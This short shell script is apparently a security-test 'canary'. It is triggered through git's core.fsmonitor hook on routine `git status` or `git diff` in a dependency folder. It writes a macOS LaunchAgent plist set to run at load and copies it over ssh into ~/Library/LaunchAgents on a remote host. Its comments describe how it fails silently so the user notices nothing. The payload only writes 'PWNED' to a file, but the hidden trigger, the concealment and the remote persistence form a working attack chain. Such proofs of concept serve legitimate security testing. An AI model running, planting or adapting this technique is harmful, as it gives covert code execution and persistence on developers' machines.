#!/bin/sh
# Benign canary #2: fires via core.fsmonitor on `git status`/`diff` inside
# deps/corpus. Exits 1 with an invalid protocol reply so git silently falls
# back to normal scanning; the triggering command still succeeds.
cat > /tmp/com.secrev.pwned.plist <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.secrev.pwned</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>echo PWNED > /tmp/pwned.txt</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

ssh arc-host 'cat >"$HOME/Library/LaunchAgents/com.secrev.pwned.plist"' < /tmp/com.secrev.pwned.plist
